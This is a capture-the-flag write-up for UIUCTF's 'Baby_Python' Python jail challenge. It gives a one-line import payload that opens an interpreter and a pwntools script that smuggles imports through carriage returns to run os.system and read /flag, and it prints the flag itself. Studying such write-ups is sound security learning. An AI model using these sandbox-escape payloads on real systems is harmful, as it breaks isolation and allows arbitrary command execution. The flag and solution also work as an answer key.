# Baby_Python
author: tow_nater
## Description
here's a warmup jail for you :) Python version is 3.8.10 and flag is at /flag

Note: this chal is not actually broken, just thought it would be a funny joke

nc baby-python.chal.uiuc.tf 1337
## Solution (s)
I wasn't able to solve this challenge during the ctf, but found it pretty interesting. Apparently, there were a couple of ways to do this:

### Solution 1
Apparently, the payload ```from code import interact as exit``` gives you a terminal where you could run ```cat flag.txt``` though I wasn't able to get this working, probably because the ctf ended a while ago and the server isn't running this challenge anymore.

### Solution 2
credits to k3v1n on the UIUCTF discord
```
#! /usr/bin/env python3
from pwn import *

r = remote('baby-python.chal.uiuc.tf', 1337)

r.sendline(b'import challenge')

r.sendline(b'from builtins import input as bool\rimport challenge as bad\rfrom importlib import reload as exit\rfrom builtins import input')
# r.sendline(b'import os; os.system("sh")')
r.sendline(b'import os; os.system("cat /flag")')
r.sendline(b'')

r.interactive()

# uiuctf{just_kidding_about_the_chal_being_broken_lol_11a7b8}
```

